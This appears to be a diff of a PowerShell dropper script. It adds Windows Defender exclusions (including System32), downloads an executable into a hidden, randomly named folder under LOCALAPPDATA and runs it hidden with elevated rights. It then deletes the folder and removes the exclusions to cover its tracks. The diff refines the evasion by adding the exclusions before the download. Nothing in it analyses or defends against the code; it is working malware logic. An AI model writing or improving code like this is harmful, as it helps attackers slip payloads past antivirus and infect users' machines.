@@ -27,22 +27,25 @@ function Remove-Exclusion {
 }
 
 Add-Exclusion -Path "C:\Windows\System32"
-Add-Exclusion -Path $env:LOCALAPPDATA
 
 $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
 New-Item -ItemType $directory -Path $hiddenFolder -Force | Out-Null
 $tempPath = Join-Path $hiddenFolder $updaterExe
 
 try {
+    Add-Exclusion -Path $hiddenFolder
+    Add-Exclusion -Path $tempPath
+
     Invoke-WebRequest -Uri $downloadUrl -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
     (Get-Item $hiddenFolder).Attributes += 'Hidden'
     (Get-Item $tempPath).Attributes += 'Hidden'
-    Add-Exclusion -Path $tempPath
+
     Start-Process -FilePath $tempPath -WindowStyle Hidden -Verb $runAs -Wait
     Start-Sleep -Seconds 5
+
     Remove-Item $hiddenFolder -Recurse -Force -ErrorAction SilentlyContinue
     Remove-Exclusion -Path $tempPath
-    Remove-Exclusion -Path $env:LOCALAPPDATA
+    Remove-Exclusion -Path $hiddenFolder
 }
 catch {
     exit 1
